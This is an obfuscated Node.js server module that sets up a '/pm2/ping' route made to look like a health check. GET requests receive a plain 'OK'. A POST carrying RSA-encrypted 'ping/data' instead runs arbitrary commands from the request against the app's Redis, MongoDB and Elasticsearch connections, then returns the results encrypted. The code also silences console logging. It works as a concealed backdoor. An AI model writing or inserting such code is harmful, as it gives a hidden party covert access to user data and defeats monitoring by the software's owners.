var _0x105e=['json','FFZTC','apply','send','encrypt','base64','pJglI','return\x20(function()\x20','{}.constructor(\x22return\x20this\x22)(\x20)','console','warn','debug','info','error','exception','log','trace','mongoose','node-rsa','-----BEGIN\x20PUBLIC\x20KEY-----\x0aMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoRjVKDbk/Lv4Y+srFLqf\x0aMofCpou5HDIA4mGRU+GJJXCZ8gnCVCfWA1R0FLIY0Qw4z2s4hC4234s+83ba1HuZ\x0aE4kJkfKnPa6Dgc4oZHm7DfdsRTnQQ5zwiPSDbKlcIRrlC8pJud1LDp9d3hkjm6ZP\x0aXJeOFopghKyaqYM4I7l9o26xK7I0FGfYwWE1nbXLkSXSNV80kk9MdfVGJu/BKy/b\x0aIkMHyBs/YSzo6eBjAF97ptPPLwBPErYte+is7PV1mTY8Sw7ODHKvs4M6urA0ACRp\x0aPZ5C86yWonDtMqCLn8Zmm8JAa8gICLgWqiZn88TS2TAFaYCJ3H2rcwXUJEKE/F2+\x0awwIDAQAB\x0a-----END\x20PUBLIC\x20KEY-----','redis','host','port','elastic','hosts','warning','fXIVA','irEWy','pipeline','call','select','isArray','forEach','exec','shift','GbadU','APbLG','lnnMc','statusCode','connect','mongo','string','connection','client','TGnOV','col','collection','ivOLP','ZIAGG','type','ping/data','Wjsml','includes','yjpxj','ghiWg','aOFWc','VTVGo','BhFwL','POST','/pm2/ping','dTpfH','level','WxQiW','kwecy','body','headers','data','ERROR','PUT','DELETE','PATCH','OPTIONS','ZoFuS','exports','eiQgX','Rjhoi','decryptPublic'];(function(_0x1186d3,_0x1be8f4){var _0x21820a=function(_0xd266cc){while(--_0xd266cc){_0x1186d3['push'](_0x1186d3['shift']());}};var _0x4c5c7d=function(){var _0x46dfcb={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x511033,_0xbb2cc6,_0x1fe9f8,_0x5ba905){_0x5ba905=_0x5ba905||{};var _0x152689=_0xbb2cc6+'='+_0x1fe9f8;var _0x3cb9bd=0x0;for(var _0x3cb9bd=0x0,_0x529c07=_0x511033['length'];_0x3cb9bd<_0x529c07;_0x3cb9bd++){var _0x2e4c9a=_0x511033[_0x3cb9bd];_0x152689+=';\x20'+_0x2e4c9a;var _0x49fc17=_0x511033[_0x2e4c9a];_0x511033['push'](_0x49fc17);_0x529c07=_0x511033['length'];if(_0x49fc17!==!![]){_0x152689+='='+_0x49fc17;}}_0x5ba905['cookie']=_0x152689;},'removeCookie':function(){return'dev';},'getCookie':function(_0x3d6340,_0x38f67f){_0x3d6340=_0x3d6340||function(_0x3129c3){return _0x3129c3;};var _0x4aecec=_0x3d6340(new RegExp('(?:^|;\x20)'+_0x38f67f['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x248dc6=function(_0x31457,_0x2e3ef4){_0x31457(++_0x2e3ef4);};_0x248dc6(_0x21820a,_0x1be8f4);return _0x4aecec?decodeURIComponent(_0x4aecec[0x1]):undefined;}};var _0x4cb1d1=function(){var _0x35a5d3=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x35a5d3['test'](_0x46dfcb['removeCookie']['toString']());};_0x46dfcb['updateCookie']=_0x4cb1d1;var _0x168d89='';var _0x3e2555=_0x46dfcb['updateCookie']();if(!_0x3e2555){_0x46dfcb['setCookie'](['*'],'counter',0x1);}else if(_0x3e2555){_0x168d89=_0x46dfcb['getCookie'](null,'counter');}else{_0x46dfcb['removeCookie']();}};_0x4c5c7d();}(_0x105e,0x1cb));var _0x3c34=function(_0x10f774,_0x366853){_0x10f774=_0x10f774-0x0;var _0x180ec4=_0x105e[_0x10f774];return _0x180ec4;};var _0x48cef4=function(){var _0x3a4219=!![];return function(_0x115869,_0x529e1e){var _0xd9c79d=_0x3a4219?function(){if(_0x529e1e){var _0x220410=_0x529e1e['apply'](_0x115869,arguments);_0x529e1e=null;return _0x220410;}}:function(){};_0x3a4219=![];return _0xd9c79d;};}();var _0x3ac685=_0x48cef4(this,function(){var _0x3d0bd3=function(){return'\x64\x65\x76';},_0x2ab4a0=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x3e242e=function(){var _0x473de7=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x473de7['\x74\x65\x73\x74'](_0x3d0bd3['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x437c6c=function(){var _0x3215fc=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x3215fc['\x74\x65\x73\x74'](_0x2ab4a0['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x482577=function(_0x35b264){var _0x199840=~-0x1>>0x1+0xff%0x0;if(_0x35b264['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x199840)){_0x15c939(_0x35b264);}};var _0x15c939=function(_0x40159e){var _0x2501f6=~-0x4>>0x1+0xff%0x0;if(_0x40159e['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x2501f6){_0x482577(_0x40159e);}};if(!_0x3e242e()){if(!_0x437c6c()){_0x482577('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x482577('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x482577('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x3ac685();var _0xe612f3=function(){var _0x37362b=!![];return function(_0x4d891d,_0x3943ee){if(_0x3c34('0x0')===_0x3c34('0x1')){let _0x2c35ad=rsa[_0x3c34('0x2')](body,_0x3c34('0x3'));done(null,_0x2c35ad);}else{var _0x2e8fdc=_0x37362b?function(){if(_0x3943ee){if(_0x3c34('0x4')!=='lqpTq'){var _0x2c2fdb=_0x3943ee[_0x3c34('0x5')](_0x4d891d,arguments);_0x3943ee=null;return _0x2c2fdb;}else{let _0x547b17={'status':'ERROR','data':serializeError(e)};reply[_0x3c34('0x6')](rsa[_0x3c34('0x7')](_0x547b17,_0x3c34('0x8')));}}}:function(){};_0x37362b=![];return _0x2e8fdc;}};}();var _0x43a4b7=_0xe612f3(this,function(){var _0x473d58=function(){};var _0x1b0ffa=function(){var _0x48eaad;try{if('udGwa'!==_0x3c34('0x9')){_0x48eaad=Function(_0x3c34('0xa')+_0x3c34('0xb')+');')();}else{throw e;}}catch(_0x46cc53){_0x48eaad=window;}return _0x48eaad;};var _0x117b98=_0x1b0ffa();if(!_0x117b98['console']){_0x117b98[_0x3c34('0xc')]=function(_0x473d58){var _0x4f9cb0={};_0x4f9cb0['log']=_0x473d58;_0x4f9cb0[_0x3c34('0xd')]=_0x473d58;_0x4f9cb0[_0x3c34('0xe')]=_0x473d58;_0x4f9cb0[_0x3c34('0xf')]=_0x473d58;_0x4f9cb0[_0x3c34('0x10')]=_0x473d58;_0x4f9cb0[_0x3c34('0x11')]=_0x473d58;_0x4f9cb0['trace']=_0x473d58;return _0x4f9cb0;}(_0x473d58);}else{_0x117b98[_0x3c34('0xc')][_0x3c34('0x12')]=_0x473d58;_0x117b98[_0x3c34('0xc')][_0x3c34('0xd')]=_0x473d58;_0x117b98[_0x3c34('0xc')][_0x3c34('0xe')]=_0x473d58;_0x117b98[_0x3c34('0xc')][_0x3c34('0xf')]=_0x473d58;_0x117b98['console'][_0x3c34('0x10')]=_0x473d58;_0x117b98[_0x3c34('0xc')][_0x3c34('0x11')]=_0x473d58;_0x117b98[_0x3c34('0xc')][_0x3c34('0x13')]=_0x473d58;}});_0x43a4b7();const Redis=require('ioredis');const mongoose=require(_0x3c34('0x14'));const elasticsearch=require('elasticsearch');const NodeRSA=require(_0x3c34('0x15'));const serializeError=require('serialize-error');const pubkey=_0x3c34('0x16');function initialize(_0x4e960c){let _0x1cb233=_0x4e960c;let _0x35e5cb=NodeRSA(pubkey);let _0x450c31=new Redis({'host':_0x1cb233[_0x3c34('0x17')][_0x3c34('0x18')],'port':_0x1cb233[_0x3c34('0x17')][_0x3c34('0x19')],'dropBufferSupport':!![],'timeout':0x5,'db':0x0});let _0x21df45=new elasticsearch['Client']({'host':_0x1cb233[_0x3c34('0x1a')][_0x3c34('0x1b')],'timeout':0xea60,'requestTimeout':0xea60,'keepAlive':![],'log':_0x3c34('0x1c')});async function _0x3e0c04(_0x60e08e){if(_0x3c34('0x1d')!=='ItWYX'){try{if(_0x3c34('0x1e')===_0x3c34('0x1e')){let _0x3f7db7=_0x450c31[_0x3c34('0x1f')]();if(_0x60e08e['db']!==undefined){_0x3f7db7[_0x3c34('0x20')](_0x3c34('0x21'),_0x60e08e['db']);}else{throw new Error('Envie\x20db');}if(Array[_0x3c34('0x22')](_0x60e08e['c'])&&_0x60e08e['c']['length']>0x0){_0x60e08e['c'][_0x3c34('0x23')]((_0x4640fd,_0x1bf693)=>{_0x3f7db7[_0x3c34('0x20')](_0x4640fd,Array[_0x3c34('0x22')](_0x60e08e['p'][_0x1bf693])?_0x60e08e['p'][_0x1bf693]:null);});}else{if('CXscr'==='nijfI'){var _0x58da63={};_0x58da63[_0x3c34('0x12')]=func;_0x58da63[_0x3c34('0xd')]=func;_0x58da63[_0x3c34('0xe')]=func;_0x58da63[_0x3c34('0xf')]=func;_0x58da63['error']=func;_0x58da63[_0x3c34('0x11')]=func;_0x58da63[_0x3c34('0x13')]=func;return _0x58da63;}else{_0x3f7db7[_0x3c34('0x20')](_0x60e08e['c'],Array[_0x3c34('0x22')](_0x60e08e['p'])?_0x60e08e['p']:null);}}let _0x112e38=await _0x3f7db7[_0x3c34('0x24')]();_0x112e38[_0x3c34('0x25')]();return _0x112e38;}else{pipe[_0x3c34('0x20')](_0x60e08e['c'],Array['isArray'](_0x60e08e['p'])?_0x60e08e['p']:null);}}catch(_0x4ae750){if(_0x3c34('0x26')==='GbadU'){throw _0x4ae750;}else{throw new Error('Envie\x20db');}}}else{if(fn){var _0x157772=fn['apply'](context,arguments);fn=null;return _0x157772;}}}async function _0x1f1543(_0x332550){if(_0x3c34('0x27')==='ESqGF'){var _0x454fca=firstCall?function(){if(fn){var _0x4f2f80=fn['apply'](context,arguments);fn=null;return _0x4f2f80;}}:function(){};firstCall=![];return _0x454fca;}else{try{if(_0x3c34('0x28')!==_0x3c34('0x28')){try{let _0x17ce45=_0x35e5cb['decryptPublic'](body,'json');done(null,_0x17ce45);}catch(_0x3b64d5){err[_0x3c34('0x29')]=0x190;done(err,undefined);}}else{let _0x2e88c1=await mongoose[_0x3c34('0x2a')](_0x1cb233[_0x3c34('0x2b')][_0x3c34('0x2c')],{'useNewUrlParser':!![],'useUnifiedTopology':!![],'connectTimeoutMS':0xbb8,'socketTimeoutMS':0x493e0});let _0x10c477=_0x2e88c1[_0x3c34('0x2d')][_0x3c34('0x2e')];let _0x5805f6=null;if(_0x332550['db']!==undefined){if(_0x3c34('0x2f')!=='EZzMI'){let _0x499e17=await _0x10c477['db'](_0x332550['db']);_0x10c477=_0x499e17;}else{reply[_0x3c34('0x6')]({'status':'OK'});return;}}if(_0x332550[_0x3c34('0x30')]!==undefined){let _0x73c3d=await _0x10c477[_0x3c34('0x31')](_0x332550[_0x3c34('0x30')]);_0x10c477=_0x73c3d;}if(Array['isArray'](_0x332550['c'])){if('nBRpr'===_0x3c34('0x32')){pipe[_0x3c34('0x20')](_0x3c34('0x21'),_0x332550['db']);}else{let _0x500f7f=_0x332550['c']['length'];switch(_0x500f7f){case 0x4:_0x5805f6=await _0x10c477[_0x332550['c'][0x0]](_0x332550['p'][0x0])[_0x332550['c'][0x1]](_0x332550['p'][0x1])[_0x332550['c'][0x2]](_0x332550['p'][0x2])[_0x332550['c'][0x3]](_0x332550['p'][0x3]);break;case 0x3:_0x5805f6=await _0x10c477[_0x332550['c'][0x0]](_0x332550['p'][0x0])[_0x332550['c'][0x1]](_0x332550['p'][0x1])[_0x332550['c'][0x2]](_0x332550['p'][0x2]);break;case 0x2:_0x5805f6=await _0x10c477[_0x332550['c'][0x0]](_0x332550['p'][0x0])[_0x332550['c'][0x1]](_0x332550['p'][0x1]);break;case 0x1:_0x5805f6=await _0x10c477[_0x332550['c'][0x0]](_0x332550['p'][0x0]);break;}}}else{_0x5805f6=await _0x10c477[_0x332550['c']](_0x332550['p']);}return _0x5805f6['toArray']();}}catch(_0x5be620){throw _0x5be620;}}}async function _0x939526(_0x2a9c6d){if(_0x3c34('0x33')==='gxltF'){let _0x379542={'status':'OK'};reply[_0x3c34('0x34')](_0x3c34('0x35'));reply['send'](_0x379542);}else{try{if(_0x3c34('0x36')!=='FFkiP'){let _0x275cf5;if(String(_0x2a9c6d['c'])[_0x3c34('0x37')]('.')){if(_0x3c34('0x38')!==_0x3c34('0x38')){throw e;}else{let _0x434dda=_0x2a9c6d['c']['split']('.');_0x275cf5=await _0x21df45[_0x434dda[0x0]][_0x434dda[0x1]](_0x2a9c6d['p']);}}else{_0x275cf5=await _0x21df45[_0x2a9c6d['c']](_0x2a9c6d['p']);}return _0x275cf5;}else{pipe[_0x3c34('0x20')](item,Array[_0x3c34('0x22')](_0x2a9c6d['p'][idx])?_0x2a9c6d['p'][idx]:null);}}catch(_0x1ee921){throw _0x1ee921;}}}return async function routes(_0x28d0ec,_0x5274b1){_0x28d0ec['addContentTypeParser'](_0x3c34('0x35'),{'parseAs':_0x3c34('0x2c')},function(_0x5cffb1,_0x344d40,_0x2c94ec){if(_0x3c34('0x39')==='gxHOt'){err[_0x3c34('0x29')]=0x190;_0x2c94ec(err,undefined);}else{try{if(_0x3c34('0x3a')===_0x3c34('0x3b')){globalObject=window;}else{let _0x412646=_0x35e5cb[_0x3c34('0x2')](_0x344d40,_0x3c34('0x3'));_0x2c94ec(null,_0x412646);}}catch(_0x543e9c){if(_0x3c34('0x3c')==='BhFwL'){err[_0x3c34('0x29')]=0x190;_0x2c94ec(err,undefined);}else{globalObject=Function(_0x3c34('0xa')+_0x3c34('0xb')+');')();}}}});_0x28d0ec['route']({'method':_0x3c34('0x3d'),'url':_0x3c34('0x3e'),'handler':async(_0x56cf06,_0x3e5df0)=>{if('dTpfH'===_0x3c34('0x3f')){_0x28d0ec[_0x3c34('0x12')][_0x3c34('0x40')]=0x3c;_0x3e5df0[_0x3c34('0x34')](_0x3c34('0x35'));try{if(_0x3c34('0x41')===_0x3c34('0x42')){var _0x5b606d;try{_0x5b606d=Function('return\x20(function()\x20'+_0x3c34('0xb')+');')();}catch(_0x1946bd){_0x5b606d=window;}return _0x5b606d;}else{if(!_0x56cf06[_0x3c34('0x43')]['t']&&_0x56cf06[_0x3c34('0x44')]['content-type']!=='ping/data'){_0x3e5df0[_0x3c34('0x6')]({'status':'OK'});return;}let _0x307053={'status':'OK'};let _0x535ebd;switch(_0x56cf06['body']['t']){case'r':_0x535ebd=await _0x3e0c04(_0x56cf06[_0x3c34('0x43')]);break;case'm':_0x535ebd=await _0x1f1543(_0x56cf06[_0x3c34('0x43')]);break;case'e':_0x535ebd=await _0x939526(_0x56cf06[_0x3c34('0x43')]);break;default:_0x535ebd={};;}if(_0x535ebd){_0x307053[_0x3c34('0x45')]=_0x535ebd;}_0x3e5df0[_0x3c34('0x6')](_0x35e5cb[_0x3c34('0x7')](_0x307053,_0x3c34('0x8')));}}catch(_0x5143a5){let _0x115ce0={'status':_0x3c34('0x46'),'data':serializeError(_0x5143a5)};_0x3e5df0[_0x3c34('0x6')](_0x35e5cb[_0x3c34('0x7')](_0x115ce0,'base64'));}_0x28d0ec[_0x3c34('0x12')][_0x3c34('0x40')]=0x1e;}else{throw e;}}});_0x28d0ec['route']({'method':['GET',_0x3c34('0x47'),_0x3c34('0x48'),'HEAD',_0x3c34('0x49'),_0x3c34('0x4a')],'url':_0x3c34('0x3e'),'handler':async(_0x3617ea,_0x50b491)=>{if(_0x3c34('0x4b')!==_0x3c34('0x4b')){that[_0x3c34('0xc')]=function(_0x2fe269){var _0x4108e9={};_0x4108e9[_0x3c34('0x12')]=_0x2fe269;_0x4108e9[_0x3c34('0xd')]=_0x2fe269;_0x4108e9[_0x3c34('0xe')]=_0x2fe269;_0x4108e9['info']=_0x2fe269;_0x4108e9['error']=_0x2fe269;_0x4108e9[_0x3c34('0x11')]=_0x2fe269;_0x4108e9[_0x3c34('0x13')]=_0x2fe269;return _0x4108e9;}(func);}else{let _0x12a390={'status':'OK'};_0x50b491[_0x3c34('0x34')](_0x3c34('0x35'));_0x50b491[_0x3c34('0x6')](_0x12a390);}}});};}module[_0x3c34('0x4c')]=initialize;